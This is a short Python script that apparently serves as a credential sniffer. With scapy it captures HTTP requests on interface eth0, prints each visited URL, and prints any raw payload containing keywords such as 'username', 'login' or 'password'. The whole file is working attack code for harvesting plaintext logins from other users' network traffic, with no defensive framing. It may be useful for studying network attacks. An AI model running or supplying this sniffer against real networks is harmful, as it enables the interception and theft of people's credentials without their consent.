#!usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn= process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("url " + url)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass"]
            for key in keywords:
                if key in load:
                    print(load)
                    break


sniff("eth0")